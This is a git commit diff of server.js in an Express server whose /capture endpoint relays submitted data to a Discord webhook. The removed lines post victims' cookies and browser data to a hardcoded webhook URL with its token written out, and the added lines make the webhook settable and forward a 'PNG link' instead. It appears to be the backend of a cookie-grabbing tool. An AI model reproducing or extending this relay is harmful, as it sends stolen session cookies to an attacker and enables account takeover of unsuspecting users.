0a9d79d0682f67effbf09a7bea43783a946f737a
freshx70-art <freshx70@gmail.com>
2026-05-26 10:59:48 -0400

    Update server.js

--- server.js
+++ server.js
@@ -7,12 +7,21 @@ const port = 3000;
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
+let webhookUrl = '';
+
+app.post('/set-webhook', (req, res) => {
+    webhookUrl = req.body.webhookId;
+    res.status(200).send('Webhook ID set');
+});
+
 app.post('/capture', (req, res) => {
-    const { cookies, browserData } = req.body;
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL';
+    const { pngLink } = req.body;
+    if (!webhookUrl) {
+        return res.status(400).send('Webhook ID not set');
+    }
 
     const data = {
-        content: `Cookies: ${JSON.stringify(cookies)}\nBrowser Data: ${JSON.stringify(browserData)}`
+        content: `PNG Link: ${pngLink}`
     };
 
     request.post(webhookUrl, { json: data }, (error, response, body) => {
